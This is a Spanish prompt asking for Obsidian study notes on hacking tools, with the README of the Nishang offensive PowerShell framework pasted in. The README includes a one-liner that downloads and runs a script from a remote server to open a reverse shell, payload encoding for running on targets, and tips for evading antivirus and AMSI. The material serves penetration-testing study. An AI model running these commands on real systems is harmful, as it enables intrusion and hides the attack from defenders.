---
Tema: "[[apuntes/herramientas/herramientas|herramientas]]"
---

Quiero que actúes como un asistente especializado en crear apuntes sobre **herramientas de hacking y ciberseguridad** para Obsidian.  
El apunte debe tener un estilo claro, visual y práctico.

### Reglas de formato:
- Usá **Markdown** y todas las herramientas de Obsidian:  
  - Encabezados jerárquicos (#, ##, ###…)  
  - Listas ordenadas y no ordenadas  
  - Callouts (`> [!info]`, `> [!tip]`, `> [!warning]`, `> [!example]`, etc.)  
  - Tablas comparativas (para flags, parámetros, modos de uso)  
  - Diagramas con **Mermaid** (para representar flujos de trabajo o ataques)  
  - Bloques de código/terminal (bash, python, etc.)  
  - Separadores `---` para estructurar  

### Estructura esperada del apunte:
1. **Introducción breve y fácil de entender**:  
   - Qué es la herramienta.  
   - Para qué sirve.  
   - En qué contextos se usa.  

2. **Guía práctica paso a paso (modo manual de uso):**  
   - Sintaxis básica.  
   - Parámetros y opciones más comunes (con ejemplos).  
   - Casos de uso típicos.  

3. **Ejemplos prácticos:**  
   - Mínimo 2 o 3 ejemplos de uso real con bloques de comandos.  
   - Añadir explicaciones claras de qué hace cada comando.  

4. **Tips y buenas prácticas:**  
   - Consejos para optimizar su uso.  
   - Posibles errores comunes y cómo evitarlos.  
### Estilo:
- Hacerlo **claro, didáctico y agradable de leer**.  
- Respetar cualquier enlace o imagen que yo agregue (no inventar nuevos).  
- Usar ejemplos comprensibles y relacionados con escenarios reales de hacking.  
- El objetivo es que quede como un **apunte tipo manual completo para estudiar y repasar en Obsidian**.

La Herramienta que quiero que hagas es: 

repo de github: Nishang

# Nishang

### Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.
By [Nikhil Mittal](https://twitter.com/nikhil_mitt)
Founder of [Altered Security - Hands-on red team and enterprise security training!](https://www.alteredsecurity.com/)
#### Usage

Import all the scripts in the current PowerShell session (PowerShell v3 onwards).

```powershell
PS C:\nishang> Import-Module .\nishang.psm1
```

Use the individual scripts with dot sourcing.

```powershell
PS C:\nishang> . C:\nishang\Gather\Get-Information.ps1

PS C:\nishang> Get-Information
```

To get help about any script or function, use:

```powershell
PS C:\nishang> Get-Help [scriptname] -full
```

Note that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name.

For example, to see the help about Get-WLAN-Keys.ps1, use

```powershell
PS C:\nishang> . C:\nishang\Get-WLAN-Keys.ps1

PS C:\nishang> Get-Help Get-WLAN-Keys -Full
```

#### Anti Virus
Nishang scripts are flagged by many Anti Viruses as malicious. The scrripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory:

Method 1. Use the in-memory dowload and execute:
Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```

Method 2. Use the `-encodedcommand` (or `-e`) parameter of PowerShell
All the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) `"Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]"`.

Encode the scrript using Invoke-Encode from Nishang:

```powershell
PS C:\nishang> . \nishang\Utility\Invoke-Encode

PS C:\nishang> Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand
```

Encoded data written to .\encoded.txt

Encoded command written to .\encodedcommand.txt

From above, use the encoded script from encodedcommand.txt and run it on a target where commands could be executed (a remote shell, meterpreter native shell, a web shell etc.). Use it like below:

```powershell
C:\Users\target> powershell -e [encodedscript]
```

If the scripts still get detected changing the function and parameter names and removing the help content will help.

In case Windows 10's AMSI is still blocking script execution, see this blog: http://www.labofapenetrationtester.com/2016/09/amsi.html